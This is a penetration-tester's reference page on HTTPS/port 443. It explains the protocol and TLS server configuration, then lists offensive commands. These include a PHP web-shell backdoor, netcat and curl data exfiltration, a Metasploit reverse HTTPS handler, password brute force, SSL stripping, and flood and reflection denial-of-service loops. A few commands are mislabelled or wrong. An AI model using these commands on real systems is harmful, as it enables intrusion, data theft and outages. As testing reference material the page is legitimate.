# P443 HTTPS

## Index

* \[\[Ports, Protocols, and Services]]
  * \[\[P80 HTTP]]

## Hypertext Transfer Protocol Secure (HTTPS)

* **Port Number:** 443
* **Protocol:** TCP
* **Service Name:** HTTPS (Hypertext Transfer Protocol Secure)
* **Defined in:** RFC 2818

Hypertext Transfer Protocol Secure (HTTPS) is an extension of HTTP, designed to provide secure communication over a computer network. HTTPS is widely used for secure communication on the World Wide Web, ensuring the confidentiality, integrity, and authenticity of the data exchanged between a client and a server. It accomplishes this by encrypting the HTTP protocol using TLS (Transport Layer Security) or SSL (Secure Sockets Layer).

### Overview of Features

* **Data Encryption:** HTTPS encrypts data transmitted between the client and the server, protecting it from eavesdropping, man-in-the-middle attacks, and data tampering.
* **Authentication:** The server presents a digital certificate to the client, proving its identity and helping to establish trust.
* **Data Integrity:** HTTPS ensures that the data sent between the client and server is not modified in transit, maintaining its integrity.
* **Confidentiality:** By encrypting the data, HTTPS ensures that sensitive information, such as passwords and credit card details, cannot be intercepted by unauthorized parties.
* **Widely Supported:** HTTPS is supported by all modern web browsers, servers, and networking equipment, making it the de facto standard for secure web communication.

### Typical Use Cases

* **Secure Web Browsing:** HTTPS is the standard for secure web browsing, ensuring that users' data is protected when accessing websites.
* **Online Transactions:** HTTPS is essential for secure online transactions, such as banking, shopping, and any other activities that involve the exchange of sensitive information.
* **API Communication:** HTTPS is used to secure communication between APIs, ensuring that data exchanged between applications is encrypted and protected.
* **Web Applications:** HTTPS is crucial for securing web applications, protecting user data, and ensuring compliance with security standards and regulations.

### How HTTPS Works

1. **Client Initiates Connection:**
   * **Step 1:** The client (usually a web browser) sends an HTTPS request to the server on port 443. This request includes the TLS/SSL version, supported cipher suites, and other options.
2. **Server Responds:**
   * **Step 2:** The server responds with a digital certificate (X.509) that contains its public key. The certificate is issued by a trusted Certificate Authority (CA).
3. **Certificate Validation:**
   * **Step 3:** The client verifies the server’s certificate against a list of trusted CAs. If the certificate is valid and matches the server’s domain, the client proceeds with the connection. If not, a warning is displayed.
4. **Session Key Generation:**
   * **Step 4:** The client and server perform a key exchange (usually using Diffie-Hellman, RSA, or ECDHE) to securely generate a shared session key. This key will be used to encrypt the communication.
5. **Secure Communication Established:**
   * **Step 5:** The client and server use the session key to encrypt and decrypt the data sent between them. This ensures that the communication remains private and secure.
6. **Data Transmission:**
   * **Step 6:** The client sends an HTTP request (such as GET or POST) over the encrypted connection. The server processes the request and sends back an encrypted response.
7. **Connection Termination:**
   * **Step 7:** Once the data exchange is complete, the client and server terminate the secure connection. This involves exchanging FIN packets to close the TCP connection securely.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>` sends an HTTPS request to `<target_ip>`:443.
* **Server:** `<target_ip>` responds with a digital certificate and proceeds with the TLS handshake.
* **Client:** `<attack_ip>` verifies the certificate, establishes a secure session, and sends an encrypted request.
* **Server:** `<target_ip>` responds with an encrypted HTTP response.

## Additional Information

### Security Considerations

* **Encryption Strength:** HTTPS uses TLS/SSL to encrypt data. The strength of the encryption depends on the cipher suite used during the handshake. Modern configurations should use strong ciphers like AES with 256-bit keys.
* **Certificate Management:** The security of HTTPS also depends on proper certificate management, including obtaining certificates from trusted CAs, renewing them before expiration, and ensuring they are configured correctly on the server.
* **Vulnerabilities:** HTTPS can be vulnerable to certain attacks, such as SSL/TLS vulnerabilities (e.g., Heartbleed, POODLE, BEAST), certificate spoofing, and misconfigurations like weak cipher suites or expired certificates.

### Alternatives

* **HTTP (Unsecured):** HTTP does not provide encryption, making it unsuitable for transmitting sensitive information over the internet.
* **VPN:** For scenarios where HTTPS is not sufficient or possible, a VPN can be used to secure the entire communication channel between a client and a server.

### Advanced Usage

* **Mutual TLS (mTLS):** In some environments, mutual TLS is used where both the client and the server authenticate each other using certificates. This provides an additional layer of security.
* **HSTS (HTTP Strict Transport Security):** HSTS is a security feature that forces browsers to interact with websites only over HTTPS, even if the user tries to access the site via HTTP.
* **OCSP Stapling:** OCSP (Online Certificate Status Protocol) stapling improves the performance and privacy of HTTPS connections by allowing the server to "staple" the OCSP response to the certificate, reducing the need for additional requests to the CA.

### Modes of Operation

* **Forward Secrecy:** Forward secrecy ensures that even if the server’s private key is compromised, past communication sessions cannot be decrypted.
* **Session Resumption:** Session resumption allows a client and server to resume an existing secure session, reducing the overhead of establishing a new session for subsequent connections.

### Configuration Files

1. **Apache HTTP Server Configuration:**

* **File Location:** `/etc/httpd/conf.d/ssl.conf`
*   **Configuration Example:**

    ```bash
    <VirtualHost *:443>
        SSLEngine on
        SSLCertificateFile /etc/ssl/certs/server.crt
        SSLCertificateKeyFile /etc/ssl/private/server.key
        SSLCertificateChainFile /etc/ssl/certs/chain.crt
        SSLProtocol all -SSLv2 -SSLv3
        SSLCipherSuite HIGH:!aNULL:!MD5
        SSLHonorCipherOrder on
    </VirtualHost>
    ```

    * **Key Settings:**
      * `SSLEngine`: Enables SSL/TLS for the virtual host.
      * `SSLCertificateFile`: Specifies the path to the server’s SSL certificate.
      * `SSLCertificateKeyFile`: Specifies the path to the server’s private key.
      * `SSLCertificateChainFile`: Specifies the path to the certificate chain file.
      * `SSLProtocol`: Configures which SSL/TLS protocols are enabled or disabled.
      * `SSLCipherSuite`: Defines the cipher suites that can be used during the TLS handshake.
      * `SSLHonorCipherOrder`: Ensures that the server's preferred cipher order is used.

2. **Nginx Configuration:**

* **File Location:** `/etc/nginx/conf.d/ssl.conf`
*   **Configuration Example:**

    ```bash
    server {
        listen 443 ssl;
        server_name example.com;
        
        ssl_certificate /etc/nginx/ssl/server.crt;
        ssl_certificate_key /etc/nginx/ssl/server.key;
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers HIGH:!aNULL:!MD5;
        ssl_prefer_server_ciphers on;
        
        location / {
            root /usr/share/nginx/html;
            index index.html;
        }
    }
    ```

    * **Key Settings:**
      * `listen 443 ssl`: Configures the server to listen on port 443 with SSL/TLS enabled.
      * `ssl_certificate`: Specifies the path to the server’s SSL certificate.
      * `ssl_certificate_key`: Specifies the path to the server’s private key.
      * `ssl_protocols`: Defines the supported TLS protocols.
      * `ssl_ciphers`: Specifies the list of allowed cipher suites.
      * `ssl_prefer_server_ciphers`: Ensures that the server's preferred cipher order is used during the TLS handshake.

### Potential Misconfigurations

1. **Weak Cipher Suites:**
   * **Risk:** Configuring the server to use weak or outdated cipher suites can expose the server to attacks like BEAST or POODLE.
   * **Exploitation:** An attacker could exploit these weaknesses to decrypt the traffic or downgrade the encryption.
2. **Expired or Self-Signed Certificates:**
   * **Risk:** Using expired or self-signed certificates can lead to warnings in browsers and might allow attackers to perform man-in-the-middle attacks.
   * **Exploitation:** An attacker could intercept and manipulate the traffic, potentially stealing sensitive information.
3. **Improper Certificate Chain Configuration:**
   * **Risk:** Incorrectly configured certificate chains can cause browsers to reject the connection or display warnings.
   * **Exploitation:** An attacker could exploit this to trick users into accepting a fraudulent certificate.
4. **Lack of HSTS:**
   * **Risk:** Without HSTS, users could be vulnerable to SSL stripping attacks where the HTTPS connection is downgraded to HTTP.
   * **Exploitation:** An attacker could intercept the communication, stripping away the encryption and exposing sensitive data.

### Default Credentials

HTTPS itself does not have default credentials, but it is often used in conjunction with web applications that may have default credentials.

* **Apache Web Server (on first installation):**
  * **Default Credentials:** N/A (depends on the application running over HTTPS).

## Interaction and Tools

### Tools

#### \[\[cURL]]

*   **Curl (Testing HTTPS):** Sends an HTTPS request to the target server and displays detailed information about the response.

    ```bash
    curl -v https://<target_ip>:443
    ```
*   **GET request:** Retrieves the content of `index.html` from the target server.

    ```bash
    curl https://<target_ip>:443/index.html
    ```
*   **POST request:** Submits a POST request with form data to the target server.

    ```bash
    curl -X POST -d "username=admin&password=secret" https://<target_ip>:443/login
    ```
*   **Custom Headers:** Sends a GET request with a custom header to the target server.

    ```bash
    curl -H "X-Custom-Header: value" https://<target_ip>:443
    ```
*   **HTTPS with Client Certificate:** Makes an HTTPS request using a client certificate for mutual TLS authentication.

    ```bash
    curl --cert client.crt --key client.key https://<target_ip>:443
    ```
*   **Ignore Certificate Errors:** Sends an HTTPS request while ignoring certificate validation errors (useful for testing self-signed certificates).

    ```bash
    curl -k https://<target_ip>:443
    ```

#### \[\[WGet]]

*   **Download File:** Downloading files, mirroring websites, and automated retrieval of web resources.

    ```bash
    wget http://<target_ip>/file
    ```
*   **Recursive Download:** Recursively downloads all files and directories from the target server.

    ```bash
    wget -r http://<target_ip>/
    ```

#### \[\[WhatWeb]]

*   **Query Domain:** Identifies the web server software, version, and technologies in use.

    ```bash
    whatweb http://<target_ip>/
    ```

#### \[\[OpenSSL]]

*   **Connect:** Establish an SSL/TLS encrypted connection to target on specified port.

    ```bash
    openssl s_client -connect <target_ip>:<target_port>
    openssl s_client -connect <target_ip>:<target_port> -starttls <protocol>
    ```
*   **Check Certificate Expiry:**

    ```bash
    openssl s_client -connect <target_ip>:<target_port> -servername <target_domain> < /dev/null 2>/dev/null | openssl x509 -noout -dates
    ```
*   **Retrieve Certificate Details:**

    ```bash
    openssl s_client -showcerts -connect www.example.com:<target_port>
    ```
*   **Generate a Self-Signed Certificate:**

    ```bash
    openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
    ```
*   **Generate a new private key and certificate signing request (CSR):**

    ```bash
    openssl req -new -newkey rsa:2048 -nodes -keyout example.com.key -out example.com.csr
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 443"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 443
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 443
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 443 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 443
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 443 < secret_data.txt
    ```
*   **HTTP Request:** Sends a manual HTTP GET request to retrieve `index.html` from the target server.

    ```bash
    echo -e "GET /index.html HTTP/1.1\r\nHost: <target_ip>\r\n\r\n" | nc <target_ip> 443
    ```

#### \[\[SoCat Cheat Sheet]]

*   **Socat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:443
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send UDP Packet:** Send a single UDP packet to the service.

    ```bash
    hping3 -2 <target_ip> -p 443 -c 1
    ```

#### \[\[Burp Suite]]

#### \[\[Nikto]]

*   **Scan Domain:** Automated scanning of web servers for common vulnerabilities and misconfigurations.

    ```bash
    nikto -h https://<target_ip>/
    ```

#### \[\[OWASP ZAP]]

#### \[\[Dirb]]

*   **Directory Brute Force:** Brute-forces directories and files on the web server to discover hidden resources.

    ```bash
    dirb http://<target_ip>/
    ```

#### \[\[Ffuf]]

*   **Directory Brute Force:** Brute-forces directories and files on the web server to discover hidden resources.

    ```bash
    ffuf -w /path/to/wordlist -u https://<target_domain>/FUZZ
    ```

#### \[\[GoBuster]]

*   **Directory Brute Force:** Brute-forces directories and files on the web server to discover hidden resources.

    ```bash
    dirb http://<target_ip>/
    ```

#### \[\[SSLScan]]

*   **Scan Target:** Detailed analysis of an HTTPS service’s SSL/TLS configuration.

    ```bash
    sslscan <target_ip>:443
    ```

#### \[\[SSLyze]]

*   **Scan Target:** Automated testing and reporting on the security of an HTTPS service.

    ```bash
    sslyze --regular <target_ip>:443
    ```

#### \[\[SSLStrip Cheat Sheet]]

*   **SSL Downgrade:**

    ```bash
    sslstrip -l 443
    ```

### Other Techniques

#### Browser Developer Tools

Inspect HTTPS traffic and SSL/TLS details directly in the browser.

## Penetration Testing Techniques

### See Also

#### \[\[Web Application]]

#### \[\[Web Application Enumeration]]

#### \[\[Front End Vulnerabilities]]

**\[\[1. Sensitive Data Exposure]]**

**\[\[2. HTML Injection]]**

**\[\[3. Insecure Direct Object References (IDOR)]]**

**\[\[4. Cross-Site Scripting (XSS)]]**

**\[\[5. Cross-Site Request Forgery (CSRF)]]**

**\[\[6. Insufficient Transport Layer Protection]]**

**\[\[7. Insecure Handling of Cookies and Sessions]]**

**\[\[8. Security Misconfigurations|8. Security Misconfigurations]]**

#### \[\[Back End Vulnerabilities]]

**\[\[1. Insecure File Uploads]]**

**\[\[2. File Inclusion]]**

**\[\[3. Command Injection]]**

**\[\[4. SQL Injection (SQLi)]]**

**\[\[5. Server-Side Request Forgery (SSRF)]]**

**\[\[6. Server-Side Template Injection (SSTi)]]**

**\[\[7. XML External Entity (XXE)]]**

**\[\[8. Insecure Deserialization]]**

**\[\[9. Security Misconfigurations|9. Security Misconfigurations]]**

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 443
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 443
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

#### Web Server Fingerprinting

*   **Tool:** \[\[WhatWeb]]

    ```bash
    whatweb http://<target_ip>/
    ```
* **Description:** Identifies the web server software, version, and technologies in use.

#### Directory Brute-Forcing

*   **Tool:** \[\[Dirb]]

    ```bash
    dirb http://<target_ip>/
    ```
* **Description:** Brute-forces directories and files on the web server to discover hidden resources.

\


*   **Tool:** \[\[Ffuf]]

    ```bash
    ffuf -w /path/to/wordlist -u https://<target_domain>/FUZZ
    ```
* **Description:** Brute-forces directories and files on the web server to discover hidden resources.

\


*   **Tool:** \[\[GoBuster]]

    ```bash
    dirb http://<target_ip>/
    ```
* **Description:** Brute-forces directories and files on the web server to discover hidden resources.

#### Web Scanning

* **Tool:** \[\[Burp Suite]]
* **Description:** Perform in-depth scans using Burp Suite to potentially identify vulnerabilities and sensitive data.

#### Certificate Information Gathering

*   **Tool:** \[\[OpenSSL]]

    ```bash
    openssl s_client -connect <target_ip>:443 -showcerts
    ```
* **Description:** Retrieves and displays the server’s certificate chain, useful for identifying the certificate authority and the strength of the encryption.

#### SSL/TLS Version Scanning

*   **Tool:** \[\[SSLScan]], \[\[OpenSSL]]

    ```bash
    sslscan --no-failed <target_ip>:443
    ```
* **Description:** Identifies the specific SSL/TLS versions supported by the target HTTPS server.

### Persistence

#### Backdoor in Web Application

*   **Tool:** \[\[Custom Scripts]]

    ```php
    <?php echo shell_exec($_GET['cmd']); ?>
    ```
* **Description:** Embeds a backdoor into an existing web application file, allowing remote command execution.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 443"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

#### SSL Strip Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]], \[\[SSLStrip Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy --proxy-https

    sslstrip -l 443
    ```
* **Description:** Stripping SSL from connections in a man-in-the-middle attack, forcing clients to connect over unencrypted channels.

### Lateral Movement, Pivoting, and Tunnelling

#### HTTPS Tunneling

*   **Tool:** \[\[SSH]], \[\[NetCat]]

    ```bash
    ssh -D 8080 -C -N -f <attack_ip>
    ```
* **Description:** Using SSH over HTTPS to tunnel traffic and facilitate lateral movement within a network.

#### Pivoting through HTTPS

*   **Tool:** \[\[Metasploit]], \[\[Custom Scripts]]

    ```bash
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set LHOST <attack_ip>
    set LPORT 443
    run
    ```
* **Description:** Establishing a reverse HTTPS shell to pivot into other network segments.

### Defense Evasion

#### HTTPS Traffic Obfuscating

*   **Tool:** \[\[cURL]]

    ```bash
    curl -H "X-Forwarded-For: 127.0.0.1" https://<target_ip>/
    ```
* **Description:** Obfuscates the source of HTTP requests to evade detection by IDS/IPS systems.

#### Encoding Payloads

*   **Tool:** \[\[cURL]]

    ```bash
    echo -n 'payload' | base64
    curl https://<target_ip>/?cmd=$(echo 'payload_base64' | base64 -d)
    ```
* **Description:** Encodes payloads in Base64 or other formats to bypass security filters.

### Data Exfiltration

#### Data Exfiltration via HTTPS

*   **Tool:** \[\[cURL]], \[\[Custom Scripts]]

    ```bash
    curl -k -X POST https://<target_ip>/upload --data-binary @sensitive_data.txt
    ```
* **Description:** Exfiltrating sensitive data over an encrypted HTTPS connection to avoid detection.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra https-post-form "https://<target_ip>/login:username=^USER^&password=^PASS^:F=incorrect" -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra https-post-form "http://<target_ip>/login:username=^USER^&password=^PASS^:F=incorrect" -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p 443 --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p 443 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### SSL/TLS Handshake Flood

*   **Tool:** \[\[OpenSSL]]

    ```bash
    while true; do openssl s_client -connect <target_ip>:443 & done
    ```
* **Description:** Floods the service with SSL/TLS handshake requests, overwhelming the server.

### Exploits

#### Heartbleed (CVE-2014-0160)

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap --script ssl-heartbleed -p 443 <target_ip>
    ```
* **Description:** Exploiting the Heartbleed vulnerability in OpenSSL to extract sensitive information from the server's memory.

#### POODLE (Padding Oracle On Downgraded Legacy Encryption)

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap --script ssl-poodle -p 443 <target_ip>
    ```
* **Description:** Exploit the POODLE vulnerability by forcing a downgrade to SSL 3.0 and performing a padding oracle attack.

#### DROWN (CVE-2016-0800)

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap --script ssl-drown -p 443 <target_ip>
    ```
* **Description:** Exploit the DROWN vulnerability by attacking servers that support both SSLv2 and TLS, potentially decrypting secure connections.

#### SSL/TLS Downgrade Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]], \[\[SSLStrip Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy

    sslstrip -l 443
    ```
* **Description:** Forces a downgrade of the SSL/TLS connection to a weaker protocol that can be exploited or decrypted.

## Resources

| **Website**              | **URL**                                                 |
| ------------------------ | ------------------------------------------------------- |
| RFC 2818 (HTTPS)         | https://tools.ietf.org/html/rfc2818                     |
| OpenSSL Documentation    | https://www.openssl.org/docs/man1.1.1/man1/openssl.html |
| Nmap Scripting Engine    | https://nmap.org/nsedoc/                                |
| SSLScan Documentation    | https://github.com/rbsec/sslscan                        |
| SSLyze Documentation     | https://github.com/nabla-c0d3/sslyze                    |
| Metasploit Documentation | https://www.metasploit.com                              |
| THC-SSL-DOS              | http://www.thc.org/thc-ssl-dos/                         |
| Heartbleed Bug           | https://heartbleed.com/                                 |
| POODLE Vulnerability     | https://www.openssl.org/\~bodo/ssl-poodle.pdf           |
| Curl Documentation       | https://curl.se/docs/                                   |
| Wireshark User Guide     | https://www.wireshark.org/docs/wsug\_html\_chunked/     |
